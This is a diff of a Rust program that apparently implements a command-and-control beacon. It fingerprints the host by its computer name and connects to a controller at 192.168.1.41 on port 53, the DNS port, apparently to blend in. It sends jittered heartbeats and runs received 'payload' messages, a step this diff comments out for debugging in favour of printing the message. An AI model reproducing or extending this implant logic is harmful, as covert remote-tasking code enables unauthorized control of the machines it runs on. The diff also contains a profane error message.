@@ -151,8 +151,9 @@ async fn main() -> io::Result<()> {
     let pub_key_pem = RsaPublicKey::to_public_key_pem(&pub_key).unwrap();
 
     // Username input
-    let key = "COMPUTERNAME";
-    let username = env::var(key).unwrap();
+    //let key = "COMPUTERNAME";
+    //let username = env::var(key).unwrap();
+    let username = "bobby".to_string();
 
     // TCP Stream creation
     let mut _stream = TcpStream::connect("192.168.1.41:53").await?;
@@ -201,7 +202,7 @@ async fn main() -> io::Result<()> {
     // Spawn thread
     let rng_thread = rng.clone();
     loop{
-        let sleep_time = std::time::Duration::from_secs(rng.gen_range(30..60));
+        let sleep_time = std::time::Duration::from_secs(rng.gen_range(10..20));
         println!("{:?}", sleep_time);
         std::thread::sleep(sleep_time);
         println!("Sending heartbeat");
@@ -216,11 +217,12 @@ async fn main() -> io::Result<()> {
                 println!("Heartbeat recieved");
                 let pingback = String::from_utf8(dec_data).expect("Found invalid UTF-8");
                 let from_json_message: Message = serde_json::from_str(&pingback).unwrap();
-                if from_json_message.message_type == "payload" {
-                    interpret_payload(from_json_message.message_content);
-                }
+                //if from_json_message.message_type == "payload" {
+                //    interpret_payload(from_json_message.message_content);
+                //}
+                println!("{}", from_json_message.message_content);
             }
-            Err(_e) => {}
+            Err(e) => {println!("Fuck you ! {}", e);}
         }
     }
 }
